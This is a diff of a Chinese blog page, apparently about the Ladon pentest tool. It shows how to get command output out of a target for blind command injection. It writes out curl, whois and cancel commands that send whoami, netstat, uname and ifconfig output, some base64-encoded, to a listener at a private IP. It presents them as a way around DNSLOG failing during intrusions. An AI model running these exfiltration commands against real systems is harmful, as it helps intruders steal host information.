@@ -206,15 +206,21 @@
 <h4 id="Base64回显"><a href="#Base64回显" class="headerlink" title="Base64回显"></a>Base64回显</h4><p><a href="http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=" target="_blank" rel="noopener">http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=</a></p>
 <h4 id="保存txt"><a href="#保存txt" class="headerlink" title="保存txt"></a>保存txt</h4><p><a href="http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=" target="_blank" rel="noopener">http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=</a><br><a href="http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=" target="_blank" rel="noopener">http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=</a></p>
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/Ladon8.1_web_echo.PNG"></p>
-<h3 id="curl回显"><a href="#curl回显" class="headerlink" title="curl回显"></a>curl回显</h3><h4 id="命令回显"><a href="#命令回显" class="headerlink" title="命令回显"></a>命令回显</h4><p>curl <a href="http://192.168.250.21:800/getstr/`whoami`" target="_blank" rel="noopener">http://192.168.250.21:800/getstr/`whoami`</a></p>
-<h4 id="Base64回显-1"><a href="#Base64回显-1" class="headerlink" title="Base64回显"></a>Base64回显</h4><p>curl <a href="http://192.168.250.21:800/deb64/`whoami|base64`" target="_blank" rel="noopener">http://192.168.250.21:800/deb64/`whoami|base64`</a><br>合并成一行，但是Ladon 8.2前的回显第行多一个-（而-符号是必须的），导致无法解密<br>curl <a href="http://192.168.250.21:800/deb64/`netstat" target="_blank" rel="noopener">http://192.168.250.21:800/deb64/`netstat</a> -an|base64|tr ‘\n’ ‘-‘`<br>所以回显的一整行，需先替换-符号后才能解密，Ladon 8.3已支持</p>
+<h3 id="curl回显"><a href="#curl回显" class="headerlink" title="curl回显"></a>curl回显</h3><h4 id="命令回显"><a href="#命令回显" class="headerlink" title="命令回显"></a>命令回显</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.250.21:800/getstr/`whoami`</span><br></pre></td></tr></table></figure>
+
+<h4 id="Base64回显-1"><a href="#Base64回显-1" class="headerlink" title="Base64回显"></a>Base64回显</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.250.21:800/deb64/`whoami|base64`</span><br></pre></td></tr></table></figure>
+
+<p>合并成一行，但是Ladon 8.2前的回显第行多一个-（而-符号是必须的），导致无法解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.250.21:800/deb64/`netstat -an|base64|tr <span class="string">'\n'</span> <span class="string">'-'</span>`</span><br></pre></td></tr></table></figure>
+
+<p>所以回显的一整行，需先替换-符号后才能解密，Ladon 8.3已支持</p>
 <h3 id="Whois回显"><a href="#Whois回显" class="headerlink" title="Whois回显"></a>Whois回显</h3><p>Ladon 8.3的Web或Gui版的NC均可回显，无论是否BASE64加密，Ladon均可完美支持</p>
-<p>root@kali:~/Desktop# whois -h 192.168.250.27 -p 800 <code>uname -a|base64</code><br>Timeout.</p>
-<p>root@kali:~/Desktop# whois -h 192.168.250.27 -p 800 <code>uname -a</code><br>Timeout.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># whois -h 192.168.250.27 -p 800 `uname -a|base64`</span></span><br><span class="line">Timeout.</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop<span class="comment"># whois -h 192.168.250.27 -p 800 `uname -a`</span></span><br><span class="line">Timeout.</span><br></pre></td></tr></table></figure>
+
 <p>使用LadonGui的NetCat，带换行结果使用base64加密<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/whois_nc.PNG"></p>
 <p>LadonGui 8.3 Netcat支持命令&amp;Base64回显</p>
 <h4 id="Ladon-Web回显"><a href="#Ladon-Web回显" class="headerlink" title="Ladon Web回显"></a>Ladon Web回显</h4><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/ladon_whois.PNG"></p>
-<h3 id="cancel回显"><a href="#cancel回显" class="headerlink" title="cancel回显"></a>cancel回显</h3><p>root@kali:~/Desktop# cancel -u “$(ifconfig)” -h 192.168.250.27:800</p>
+<h3 id="cancel回显"><a href="#cancel回显" class="headerlink" title="cancel回显"></a>cancel回显</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># cancel -u "$(ifconfig)" -h 192.168.250.27:800</span></span><br></pre></td></tr></table></figure>
 <p>cancel明文回显结果在Brequesting-username和”my-jobs之中</p>
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/linux_cancel.PNG"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文主要使用Ladon的WEB与NC实现回显，实战中很多机器可能并不能DNS解析，意味着DNSLOG方法无效，但是Ladon可以完美解决DNS不解析导致DNSLOG失效的问题。</p>
